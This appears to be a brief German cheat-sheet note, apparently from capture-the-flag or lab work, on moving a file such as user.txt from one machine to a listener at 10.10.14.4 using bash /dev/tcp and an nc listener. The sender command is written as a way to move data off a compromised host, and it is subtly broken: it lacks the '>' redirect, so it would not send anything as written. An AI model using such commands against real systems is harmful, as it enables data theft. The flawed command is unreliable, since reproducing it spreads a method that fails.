# Datentransfer via nc
## Sender
```bash
cat user.txt /dev/tcp/10.10.14.4/6789
```

## Empfänger
```bash
nc -lvnp 6789 > user.txt
```
